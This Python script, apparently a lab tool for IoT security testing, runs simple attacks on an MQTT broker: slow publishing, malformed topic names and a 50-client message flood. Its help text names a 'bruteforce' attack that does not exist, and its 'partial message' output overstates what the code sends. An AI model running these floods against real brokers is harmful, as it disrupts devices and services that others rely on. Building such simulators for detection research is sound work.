import time
import random
import argparse
import paho.mqtt.client as mqtt
import threading

# ===================== Config =====================
BROKER = "raspberrypi.local"  # Change to your MQTT broker address
PORT = 1883
TOPIC = "iot/attack"

# ================== Attack Functions ==================

def simulate_slowite(client_id="slowite_sim", topic=TOPIC):
    print("[*] Starting SlowITe attack...")
    client = mqtt.Client()
    client.connect(BROKER, 1883, 60)
    client.loop_start()
    for i in range(10):  # Simulate slow publish
        client.publish(f"{topic}/flood", payload=f"slow-{i}", qos=2)
        print(f"[SlowITe] Sent partial message {i}, sleeping...")
        time.sleep(5)  # Delay between sends
    client.loop_stop()
    client.disconnect()
    print("[+] SlowITe attack completed.")

def simulate_malformed():
    print("[*] Starting Malformed attack...")
    client = mqtt.Client()
    client.connect(BROKER, 1883, 60)
    client.loop_start()
    malformed_topics = ["/", "////", "\x00", "💥💥💥", "a" * 500]
    for i, topic in enumerate(malformed_topics):
        try:
            client.publish(TOPIC+topic, payload="test", qos=2)
            print(f"[Malformed] Published to '{topic}'")
            time.sleep(1)
        except Exception as e:
            print(f"[Malformed Error {i}]: {e}")
    client.loop_stop()
    client.disconnect()
    print("[+] Malformed attack completed.")

def simulate_ddos(topic=TOPIC):
    print("[*] Starting DDoS attack...")
    
    def spam_client(i):
        client = mqtt.Client(client_id=f"ddos_{i}")
        try:
            client.connect(BROKER, 1883, 60)
            client.loop_start()
            for j in range(10):
                client.publish(topic+"/dos", payload=f"spam-{i}-{j}", qos=2)
            client.loop_stop()
            client.disconnect()
            print(f"[DDoS {i}] Done.")
        except Exception as e:
            print(f"[DDoS Error {i}]: {e}")

    threads = []
    for i in range(50):  # 50 clients
        t = threading.Thread(target=spam_client, args=(i,))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print("[+] DDoS attack completed.")

# ================== Attack Dispatcher ==================

def run_attack(attack_type):
    attacks = {
        "flood": simulate_slowite,
        "malformed": simulate_malformed,
        "ddos": simulate_ddos
    }

    attack_func = attacks.get(attack_type.lower())
    if attack_func:
        attack_func()
    else:
        print("Invalid attack type. Choose from:", ", ".join(attacks.keys()))

# ================== CLI Support ==================

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="MQTT Attack Simulator")
    parser.add_argument("--attack", type=str, required=True,
                        help="Attack type to run: slowite, malformed, bruteforce, ddos")
    args = parser.parse_args()
    run_attack(args.attack)
